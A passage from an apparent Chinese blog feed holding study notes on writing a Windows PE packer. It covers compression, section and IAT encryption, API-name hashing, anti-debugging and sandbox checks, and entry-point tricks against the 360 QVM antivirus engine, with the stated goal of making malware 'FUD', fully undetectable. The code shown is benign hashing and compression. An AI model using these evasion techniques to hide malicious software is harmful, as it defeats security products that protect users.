$</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>写个壳</title>
    <link href="/%E5%86%99%E4%B8%AA%E5%A3%B3.html"/>
    <url>/%E5%86%99%E4%B8%AA%E5%A3%B3.html</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="已有"><a href="#已有" class="headerlink" title="已有"></a>已有</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">压缩区段<br>加密区段<br>清除数据目录表<br>修复重定位<br></code></pre></td></tr></table></figure><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">1</span>.能够突破看雪的虚拟化检测<span class="hljs-keyword">dbg</span>插件<br><span class="hljs-number">2</span>.FUD “FUD”代表恶意软件完全不可被检测到的意思<br><span class="hljs-number">3</span>.从攻击者角度来研究病毒查杀技术<br></code></pre></td></tr></table></figure><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span>   最核心的就是伪装，完全模拟正常PE程序。<br><br><span class="hljs-bullet">2.</span>   壳代码没有异常行为，不触发杀软的检测规则。<br><br><span class="hljs-bullet">3.</span>   傀儡文件的OEP代码尽量避免影响被加壳程序的正常执行<br><br><span class="hljs-bullet">4.</span>   核心功能为减少暴露面，提高做免杀的速度<br><br><span class="hljs-bullet">5.</span>   通过混淆引擎混淆壳代码，达到混淆后无特征代码。<br><br><span class="hljs-bullet">6.</span>   支持壳上壳，通过加其他VM壳处理内存特征码、反分析。<br></code></pre></td></tr></table></figure><p>不能使用多线程来进行解压缩   因为在shell代码中线程化是一个非常糟糕的想法！</p><h2 id="基础和高级"><a href="#基础和高级" class="headerlink" title="基础和高级"></a>基础和高级</h2><h3 id="一般的加壳都是下面这些步骤"><a href="#一般的加壳都是下面这些步骤" class="headerlink" title="一般的加壳都是下面这些步骤"></a>一般的加壳都是下面这些步骤</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span>使用加壳器给被加壳程序添加新区段。<br><span class="hljs-number">2.</span>加密/压缩被加壳程序。<br><span class="hljs-number">3.</span>将stub的代码段移植到新区段。 stub.dll<br><span class="hljs-number">4.</span>将被加壳程序的OEP记录到<span class="hljs-keyword">share</span>.h中。<br><span class="hljs-number">5.</span>将被加壳程序的EP设置到新区段。<br><span class="hljs-number">6.</span>保存为新文件。<br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gcode">在PE文件中开辟空间用于存储补丁代码<br>复制扩展PE头中的数据目录表<span class="hljs-comment">(DataDirectory)</span>的内容到存储补丁的空间中，复制完后清空原本的数据目录表<br>修正复制过去的数据目录表的内容<br>对修正完的数据目录表之后的数据<span class="hljs-comment">(不包括补丁部分)</span>进行加密<br>修改PE文件的程序入口为补丁代码<br>补丁代码还原前面被清空的数据目录表<br>补丁代码解密先前加密的数据<br>补丁代码加载导入表中需要导入的DLL<br>补丁代码修正IAT<br>补丁代码执行完后返回原本的程序入口<br></code></pre></td></tr></table></figure><ul><li>加壳的<strong>难点</strong>在于将数据目录项<strong>复制</strong>到补丁代码部分，并<strong>修正</strong>复制后的数据目录项</li><li>加壳中加密的核心是<strong>加密算法</strong></li></ul><h3 id="一般壳都是带压缩的壳"><a href="#一般壳都是带压缩的壳" class="headerlink" title="一般壳都是带压缩的壳"></a>一般壳都是带压缩的壳</h3><p>压缩是一个比较复杂的过程，对于一个主要功能的加密的壳来说，压缩也有一定的加密效果，如果使用了一些加密库加密，即使你压缩了，会发现加壳后的文件比没加壳之前还要大！</p><p>vmp用不好，就变成了第三类壳：增积壳<br>作用：虽然没有虚拟化保护软件关键函数，但是可以增加软件体积，吓唬破解者，顺便增加检测虚拟机或是调试器附加的功能</p><p>很多常见的壳都用汇编写的，确实，汇编确实可以写出很多短小精悍、骚操作的代码，这是C++所没有的，但是C++支持内联汇编，在一定程度上弥补了它的不足。</p><h3 id="加密节-除了tls和rsrc"><a href="#加密节-除了tls和rsrc" class="headerlink" title="加密节(除了tls和rsrc)"></a>加密节(除了tls和rsrc)</h3><p>比如加密压缩的过程中每次可以随机使用不同的加密压缩算法，比如调用rar，zip，upx的压缩算法，比如使用DES、3DES、AES 、 RSA、DSA 、SHA-1、MD5等加密算法……或者这些都随机调用，每次生成算法都不同</p><h3 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h3><p>哈夫曼树 upx </p><p>到现在我比较想写的是unishox2压缩算法<a href="https://github.com/siara-cc/Unishox2">siara-cc&#x2F;Unishox2: Compression for Unicode short strings (github.com)</a>和base-N压缩算法<a href="https://modexp.wordpress.com/">莫迪克|关于计算机安全的随机帖子 (wordpress.com)</a></p><h3 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h3><p>参考VMP</p><p>学保护模式 ——》 为了突破UAC   (也能学到反调试)</p><p>反调试    –》为了学加壳等</p><p>学tenprotect的保护机制 –》反向学习反调试(因为会学到<strong>Windbg双机调试的保护、ValidAccessMask清零的保护和DebugPort清零</strong>的保护)</p><p>对于PE结构的表的获取结构体 还有一种是利用特征码的获取结构体(只能获取某个内核api)  显然就没那么高操作 pe表获取结构体也会引用其中内容。所以pe结构是一个值得反复学习的东西</p><p>常规的反调试都是getparentpresent和beginndebuged来获取是否被调试。</p><p>2019年有一个文章用的是NtqueryInformationProcess(这个函数可以同时在0环和3环运行)的第二个参数传入ProcessDeubgpory并获取传出的nDebugPort来判断是否被调试</p><p>写出了好的反调试方法，可以放在壳代码的各个角落，检测到调试就马上退出程序，多放置几个阴人位置，这样就能增加破解的难度了！</p><p>在32位程序中，有人把钩子挂到64位的”ntdll.dll”上，然后来反反调试，可以用crc校验或者检测关键字节来反反反调试</p><p><a href="https://www.52pojie.cn/thread-1277269-1-1.html">https://www.52pojie.cn/thread-1277269-1-1.html</a></p><p>一般虚拟机沙箱的网卡还有文件默认设置 进程少等特点 可以用来检测一下</p><p>30个反调试方法(2016年)</p><p><a href="https://github.com/wanttobeno/AntiDebuggers/blob/master/Tencent2016D.cpp">https://github.com/wanttobeno/AntiDebuggers/blob/master/Tencent2016D.cpp</a></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><p><a href="https://github.com/strivexjun/XAntiDebug/blob/master/XAntiDebug/XAntiDebug.cpp">https://github.com/strivexjun/XAntiDebug/blob/master/XAntiDebug/XAntiDebug.cpp</a></p><p>anti-debug-popf</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><p>anti-debug-int2d</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><p>当然直接ollvm可以直接反调试</p><h3 id="加密iat"><a href="#加密iat" class="headerlink" title="加密iat"></a>加密iat</h3><p>IAT(导入地址表 import address table)每个元素的地址就是内存窗口的地址</p><p>这时候我们就需要去加密这些地址来干扰调试器对winapi的获取</p><p>加密原理</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs">遍历导入表获取每个函数的IAT地址（对应上图内存栏中地址的值）<br>取出IAT地址的内容，就是函数的地址（上图内存栏中数值的值），把该函数地址进行加密后得到一个数据<br>申请一段内存，其中存放解密上述的数据得到真地址，然后调用该地址的代码。<br>把申请的内存地址放入IAT地址对应的数值中。<br>完成以上步骤后IAT就被加密了，当然第3步当中可以进行适当的混淆和加花指令别人就更加看不出来了。<br><br></code></pre></td></tr></table></figure><p>hash单向散列(数值加密) 加密api函数的字符串 (因为一些有经验的逆向师会对字符串比较敏感)</p><p>众所周知1个字节是8位，这代表他表示2的8次方个数，也就是256种可能，如果我们把它的一个数据代表一个系统中的函数（API），相当于给函数一个序号，那么1个字节就能存储256个函数的信息，那2个字节就能存储2的16次方也就是65536个API函数，这真是大大的好消息， windows系统中的API函数也就几千个，2个字节存储其全部API函数信息真是绰绰有余。</p><p>而让这2个字节的数据代表一个函数，这个数据我们称它为Hash值，因此需要设计一个算法。我在这设计是方法是定义一个2字节类型（short）的数据，分别把nHash值先左移11位再右移5位后相加，再加上API函数中一个字符的Ascii码，以此循环遍历完整个API函数的所有字符，得到一个我们需要的Hash值。在之前写壳基础篇中提到过壳代码中的API是动态获取的，那么我们在动态获取的时候使用Hash值更能提高隐蔽性，使破解者不易发现我们所要使用的是哪个函数。<br>具体Hash加密代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>&#123;<br><span class="hljs-comment">//用于保存Hash值</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> nHash = <span class="hljs-number">0</span>;<br><span class="hljs-type">char</span> arr[<span class="hljs-number">50</span>] = &#123;&#125;, *p;<br>p = arr;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入API: &quot;</span>);<br>scanf_s(<span class="hljs-string">&quot;%s&quot;</span>, arr, <span class="hljs-number">50</span>);<br><span class="hljs-keyword">while</span> (*p)<br>&#123;<br><span class="hljs-comment">//先左移11位再右移5位相加后再加上该字符的Ascii</span><br>nHash = ((nHash &lt;&lt; <span class="hljs-number">11</span>) | (nHash &gt;&gt; <span class="hljs-number">5</span>));<br>nHash = nHash + *p;<br>p++;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hash值为：0x%X\n&quot;</span>, nHash);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>使用纯汇编来在壳代码中写入解密函数的好处</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-number">1.</span>代码少<br><span class="hljs-number">2.</span>更能锻炼基本功<br><span class="hljs-number">3.</span>可以用到一些骚操作<br><span class="hljs-number">4.</span>壳主要是指针的操作（加壳程序还得算上文件<span class="hljs-variable">IO</span>），汇编相对于<span class="hljs-built_in">C</span><span class="hljs-operator">/</span><span class="hljs-built_in">C</span><span class="hljs-operator">++</span>操纵指针起来更加得心应手。<br><span class="hljs-number">5.</span>尤其是汇编可以直接操纵堆栈，由此有了两大优势：一、方便数据寻址，二、方便堆栈平衡。<br><br></code></pre></td></tr></table></figure><p>hash加密(要有密钥的那种)</p><p>动态加密</p><p>加入动态解密的壳，这无疑是强度较高的壳了，它能够在目标程序运行起来之后，动态的对代码段进行解密。先运行一段代码解密后一部分的代码，然后再运行解密后的代码，可以往复循环，这样破解者只能看见运行着的代码的附近的代码，隔得远的代码处于加密状态，这样就需要花费大量的时间才能破解了，当然想要实现这种高强度，还是需要花费很多时间去设计的，而且要求我们对x86汇编语言有比较深刻理解，</p><p>解密代码才是动态解密中的核心点，重中之重。因为加密代码全部去加密就可。解密代码的话就将代码分段分时解密</p><p>这里要说一下GetPC技术，GetPC技术翻译为中文也就是获取指针计数器。在x86汇编中实际上就是获取当前代码EIP的技术。我这用的是call 指令，call xxx指令相当于 push 下一行代码的EIP + jmp xxx。 那么我们直接把XXX改为下一行指令的地址就能获取当前EIP </p><p>其他操作</p><p>在遍历还原导入表时，并没有直接将API的地址填入到IAT里，而是将节表5的地址，从起始位置开始，每隔16个字节，将地址填入到IAT里，然后在对应的节表5地址上填入push 真实函数地址 + retn的汇编指令。这样一来，原PE程序运行调用API时，就会跳到节表5里面，再从节表5里面跳到真实API地址，直接干掉了x64dbg的脱壳导入表自动修复功能。</p><h3 id="虚拟壳-技术要求过高-以后写-“如果虚拟壳写的好直接拿去卖也不用工作-年入50w-”"><a href="#虚拟壳-技术要求过高-以后写-“如果虚拟壳写的好直接拿去卖也不用工作-年入50w-”" class="headerlink" title="虚拟壳(技术要求过高 以后写 “如果虚拟壳写的好直接拿去卖也不用工作 年入50w+”)"></a>虚拟壳(技术要求过高 以后写 “如果虚拟壳写的好直接拿去卖也不用工作 年入50w+”)</h3><p>虚拟技术应用到壳的领域，设计了一套<a href="https://so.csdn.net/so/search?q=%E8%99%9A%E6%8B%9F%E6%9C%BA&spm=1001.2101.3001.7020">虚拟机</a>引擎，将原始的汇编代码转译成虚拟机指令，要理解原始的汇编代码，就必须对其虚拟机引擎进行研究，而这极大地增加了破解和逆向的难度及成本。</p><h3 id="随机花指令构造器"><a href="#随机花指令构造器" class="headerlink" title="随机花指令构造器"></a>随机花指令构造器</h3><p>构造花指令，可以使用无条件跳转，比如ret、call、jmp来跳转，也可以使用有条件跳转，跳转的越多，能给人造成的困扰越大。</p><h3 id="兼容"><a href="#兼容" class="headerlink" title="兼容"></a>兼容</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.pqcloud.com/CD%5C202210302007687.png" alt="image-20221030200744494"></p><p>xp-win11 x64 x32 都得兼容</p><h3 id="内核型加壳器-sys的"><a href="#内核型加壳器-sys的" class="headerlink" title="内核型加壳器 .sys的"></a>内核型加壳器 .sys的</h3><h3 id="伪装OEP"><a href="#伪装OEP" class="headerlink" title="伪装OEP"></a>伪装OEP</h3><h3 id="压缩资源"><a href="#压缩资源" class="headerlink" title="压缩资源"></a>压缩资源</h3><p>注意 是压缩资源 不是压缩区段</p><p>换句话说就是加壳压缩</p><p>用到的有:</p><p>哈夫曼编码(好像已启用) UPX源码 IEXPRESS UPX ASProtect WinRAR NSPack DarkCrypt</p><p>alib原理</p><p><strong>1：当压缩算法扫描到中间某段位置时，如何和前面的内容进行快速比较。</strong></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade">首先回答第一个问题，很简单，用哈希，笔者采用了FNV哈希算法，效果挺好的，用c++stl中的<span class="hljs-built_in">hash</span>不知道效果如何，不过其实后来发现，哈希冲突在这里并不严重，一个好的哈希只能带来速度和内存的提升了，没办法提升压缩率的。然后我们如何解决哈希冲突呢，<span class="hljs-built_in">hash</span>冲突这里其实是重点，所表达的就是可能出现了相同字节串。<br>我们先说这个算法如何工作，首先我们只对定长的几个字节算<span class="hljs-built_in">hash</span>值，例如我们只算<span class="hljs-number">5</span>个字节的<span class="hljs-built_in">hash</span>值，然后保存<span class="hljs-built_in">hash</span>，之后每扫描一个字节，取出当前位置往后<span class="hljs-number">5</span>个字节，算<span class="hljs-built_in">hash</span>，和前面的比较，如果<span class="hljs-built_in">hash</span>值相同，则在进一步比较每个字节内容，<span class="hljs-built_in">hash</span>可以很快的知道内容是不一样的，没有办法知道内容是一样的，所以我们还需要实际的去比较每个字节，这意味着，我们在保存<span class="hljs-built_in">hash</span>的时候，还需要保存算得这个<span class="hljs-built_in">hash</span>的字节在整个文件中的index，我们取出上一个相同<span class="hljs-built_in">hash</span>值的字节的起始index，和当前位置往后比，一直比到文件结束或着出现不同，这里是一个重点，如：abcdefgabcabcabcabc，想象一下，这里如何压缩呢，好的做法是：abcdefg3339,第一组<span class="hljs-number">33</span>代表offet是<span class="hljs-number">3</span>，长度是<span class="hljs-number">3</span>，第二个<span class="hljs-number">39</span>offet是<span class="hljs-number">3</span>（就是第一个<span class="hljs-number">03</span>），长度是<span class="hljs-number">9</span>，所以，相同字节串可以涵盖本身（<span class="hljs-number">39</span>包含了自己）。<br>回到前面，我们应该如何设计保存<span class="hljs-built_in">hash</span>的结构了，首先为了快速索引，应该用一个数组或者vector保存<span class="hljs-built_in">hash</span>，既<span class="hljs-built_in">hash</span>值作为下标，这样可以快速索引，如何解决<span class="hljs-built_in">hash</span>冲突呢，easy，不解决，只保存，如我们构造一个长度为<span class="hljs-number">1000</span>的数组，把数组分成<span class="hljs-number">100</span>块，每块有<span class="hljs-number">10</span>个元素，产生的<span class="hljs-built_in">hash</span>值在<span class="hljs-number">0</span><span class="hljs-number">-99</span>中间，现在算的<span class="hljs-built_in">hash</span>值为<span class="hljs-number">1</span>，那么在第一块的第一个位置填入此时的index,往后又算出<span class="hljs-built_in">hash</span>值<span class="hljs-number">1</span>时，则在第<span class="hljs-number">1</span>块的第二个位置填入，所以，这里的块数作为<span class="hljs-built_in">hash</span>索引， 一块里面有多少个则代表可填入相同<span class="hljs-built_in">hash</span>值的数量，所以如果数量很多，那么就覆盖前面的，这里可以用一个环形缓冲区实现。<br></code></pre></td></tr></table></figure><p><strong>2：如何区分当前是压缩的内容，还是未压缩的内容。</strong></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">回答第二个问题，如何分别是原来未压缩的数据，还是保存的<span class="hljs-built_in">offset</span>和<span class="hljs-built_in">length</span>呢，用VLQ编码，此处请goolge vlq编码，此外在实际验证中发现，<span class="hljs-built_in">offset</span> 和<span class="hljs-built_in">length</span>采用vlq编码后，往往<span class="hljs-built_in">length</span>比较小，采用vlq至少需要一个字节，所以可以考虑将<span class="hljs-built_in">length</span>编入<span class="hljs-built_in">offset</span>中，既<span class="hljs-built_in">offset</span>低位保存<span class="hljs-built_in">length</span>，再节省空间。<br></code></pre></td></tr></table></figure><h4 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h4><p>左节点右节点相加提供给单链 </p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">首先需要给出文件压缩和下面将要提到的文件解压缩的公共头文件<br><span class="hljs-number">1</span>.根据值和频率统计结果<br><span class="hljs-number">2</span>.利用结果创建哈夫曼树,得到相应的每个字符的哈夫曼编码<br><span class="hljs-number">3</span>.将数据写入文件<br>(<span class="hljs-number">1</span>)校验头filehead<br>(<span class="hljs-number">2</span>)将字符值和频率写入文件中<br>解压缩时重新创建hafuman数来译码<br></code></pre></td></tr></table></figure><h4 id="lzma-lz系列"><a href="#lzma-lz系列" class="headerlink" title="lzma  (lz系列)"></a>lzma  (lz系列)</h4><p>采用马尔科夫链主要利用马尔科夫随机过程来消除原始文件中的基于上下文的冗余（如英文中字母Q后面紧接的字母为U的概率远较其它字母大），而不仅仅是<a href="https://so.csdn.net/so/search?q=%E5%93%88%E5%A4%AB%E6%9B%BC&spm=1001.2101.3001.7020">哈夫曼</a>编码中单纯的基于字符出现的随机统计概率</p><p>就是abcdefgabc转换成abcdefg73</p><h4 id="quicklz-号称世界上最快的压缩算法"><a href="#quicklz-号称世界上最快的压缩算法" class="headerlink" title="quicklz  号称世界上最快的压缩算法"></a>quicklz  号称世界上最快的压缩算法</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">std::string <span class="hljs-title">quicklz_compress</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string&amp; src)</span></span><br><span class="hljs-function"></span>&#123;<br>    qlz_state_compress state;<br>    <span class="hljs-built_in">memset</span>(&amp;state, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(qlz_state_compress));<br>    std::string dst;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">4096</span> + <span class="hljs-number">1024</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">size_t</span> pos = <span class="hljs-number">0</span>;pos&lt;src.<span class="hljs-built_in">size</span>();pos+=<span class="hljs-number">4096</span>) &#123;<br>        <span class="hljs-type">size_t</span> len = src.<span class="hljs-built_in">size</span>() - pos;<br>        len  = len &gt; <span class="hljs-number">4096</span> ? <span class="hljs-number">4096</span> : len;<br>        len = <span class="hljs-built_in">qlz_compress</span>(src.<span class="hljs-built_in">data</span>() + pos, buffer, len, &amp;state);<br>        dst.<span class="hljs-built_in">append</span>(buffer,len);<br>    &#125;<br>    <span class="hljs-keyword">return</span> dst;<br>&#125;<br></code></pre></td></tr></table></figure><p>在压缩的过程中不断地读入3个字节，然后根据这3个字节得到一个hash值，根据这个hash值就可以找到offset，这个offset就是上次这个hash值出现的位置，而通过cache可以判断出这次出现的和最近一次出现相同hash值的时候的3个字节是不是相同（可能hash相同而实际的值不同）。</p><p>level1   四个字节四个字节的hash对比 获取重复值</p><p>level2   对比4个offset的hash 选取其中最长的当模板</p><p>level3</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span>(matchlen == <span class="hljs-number">3</span> &amp;&amp; offset &lt;= <span class="hljs-number">63</span>)<br>&#123;<br>    *dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)(offset &lt;&lt; <span class="hljs-number">2</span>);<br>    dst++;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (matchlen == <span class="hljs-number">3</span> &amp;&amp; offset &lt;= <span class="hljs-number">16383</span>)<br>&#123;<br>    ui32 f = (ui32)((offset &lt;&lt; <span class="hljs-number">2</span>) | <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">fast_write</span>(f, dst, <span class="hljs-number">2</span>);<br>    dst += <span class="hljs-number">2</span>;<br>&#125;        <br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (matchlen &lt;= <span class="hljs-number">18</span> &amp;&amp; offset &lt;= <span class="hljs-number">1023</span>)<br>&#123;<br>    ui32 f = ((matchlen - <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">2</span>) | ((ui32)offset &lt;&lt; <span class="hljs-number">6</span>) | <span class="hljs-number">2</span>;<br>    <span class="hljs-built_in">fast_write</span>(f, dst, <span class="hljs-number">2</span>);<br>    dst += <span class="hljs-number">2</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(matchlen &lt;= <span class="hljs-number">33</span>)<br>&#123;<br>    ui32 f = ((matchlen - <span class="hljs-number">2</span>) &lt;&lt; <span class="hljs-number">2</span>) | ((ui32)offset &lt;&lt; <span class="hljs-number">7</span>) | <span class="hljs-number">3</span>;<br>    <span class="hljs-built_in">fast_write</span>(f, dst, <span class="hljs-number">3</span>);<br>    dst += <span class="hljs-number">3</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    ui32 f = ((matchlen - <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">7</span>) | ((ui32)offset &lt;&lt; <span class="hljs-number">15</span>) | <span class="hljs-number">3</span>;<br>    <span class="hljs-built_in">fast_write</span>(f, dst, <span class="hljs-number">4</span>);<br>    dst += <span class="hljs-number">4</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在level&#x3D;3的时候与前两个的不同之处是最低的两位统一作为标志</p><p><a href="http://www.wjhsh.net/xumaojun-p-8541618.html">http://www.wjhsh.net/xumaojun-p-8541618.html</a></p><h3 id="图形化"><a href="#图形化" class="headerlink" title="图形化"></a>图形化</h3><h3 id="壳代码纯shellcode开发"><a href="#壳代码纯shellcode开发" class="headerlink" title="壳代码纯shellcode开发"></a>壳代码纯shellcode开发</h3><p>将壳代码编译为Shellcode代码，方便移植、混淆、特征码定位。Shellcode开发方法论坛搜索即可，非常多的帖子。</p><h3 id="API字符串隐藏"><a href="#API字符串隐藏" class="headerlink" title="API字符串隐藏"></a>API字符串隐藏</h3><p>Shellcode编程的常规编写技巧，将API字符串转为HASH，壳代码通过HASH来获取API地址。此技术主要用于缩短Shellcode体积、干扰分析人员分析。</p><h3 id="Shellcode动态获取外部参数"><a href="#Shellcode动态获取外部参数" class="headerlink" title="Shellcode动态获取外部参数"></a>Shellcode动态获取外部参数</h3><p>参考”图-CodeLoader数据结构”可以发现壳代码CodeLoaderCode(EntryPoint函数生成在壳代码CodeLoaderCode的首部)是储存在PARAM_CODE_LOADER结构体的尾部。</p><p>  因此只需要动态定位到&amp;EntryPoint函数的内存地址，然后减去sizeof(PARAM_CODE_LOADER)就可以获取到加壳器传递的参数数据了。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.pqcloud.com/CD%5C202211051701031.jpeg" alt="img"></p><h3 id="简单图片隐写技术-最大化的压缩体积"><a href="#简单图片隐写技术-最大化的压缩体积" class="headerlink" title="简单图片隐写技术(最大化的压缩体积)"></a>简单图片隐写技术(最大化的压缩体积)</h3><h3 id="入口点模糊技术"><a href="#入口点模糊技术" class="headerlink" title="入口点模糊技术"></a>入口点模糊技术</h3><p> QVM引擎已经对主流编译器编译的程序，从入口点&#x3D;&#x3D;（OEP）&#x3D;&#x3D;开始提取&#x3D;&#x3D;一段&#x3D;&#x3D;特征代码作为判断依据，因此只要修改入口点代码QVM引擎就会报“HEUR&#x2F;Malware.QVM20.Gen”。</p><p>杀软检测入口点代码的绕过方法：</p><p>1、 使用壳代码完全伪造主流编译器编译的程序的入口点特征</p><p>2、 不修改入口点开始处的代码，而是在QVM引擎提取的入口点特征代码的&#x3D;&#x3D;尾部劫持执行流&#x3D;&#x3D;(此壳就是使用的这个方法)<img src="https://cd-1307445315.cos.ap-nanjing.pqcloud.com/CD%5C202211051713878.jpeg" alt="img"></p><h3 id="内存加载PE-amp-支持壳上壳"><a href="#内存加载PE-amp-支持壳上壳" class="headerlink" title="内存加载PE&amp;支持壳上壳"></a>内存加载PE&amp;支持壳上壳</h3><p>​当前使用的内存中加载PE技术,是通过将”被加壳程序”内存展开后，覆盖到当前进程的ImageBase处，随后修复”被加壳程序”的IAT表，设置区段属性，最终调用”被加壳程序”的OEP将执行权限交给”被加壳程序”。这种写壳方式的天生就支持壳上壳功能。</p><p>​壳上壳的功能主要是为了躲避内存查杀。可使用VMP、TMD、SE等虚拟化壳的代码虚拟化功能来模糊化被加壳程序的内存特征，当然使用自写的VM、混淆引擎更好，&#x3D;&#x3D;不过写一个稳定、兼容性好的VM、混淆引擎耗时太长。&#x3D;&#x3D;</p><p>加多重壳需要注意关闭内层壳的校验基址，如下图的VMP：<img src="https://cd-1307445315.cos.ap-nanjing.pqcloud.com/CD%5C202211051728203.jpeg" alt="img"></p><h3 id="兼容性较好的修复IAT表方法"><a href="#兼容性较好的修复IAT表方法" class="headerlink" title="兼容性较好的修复IAT表方法"></a>兼容性较好的修复IAT表方法</h3><p>使用双向链表</p><p>​兼容性较好的修复导入表(IAT)方法，优先使用INT表来获取API地址。解决有些编译器编译的程序导入表(IAT)不规范的问题（Delphi）。</p><figure class="highlight 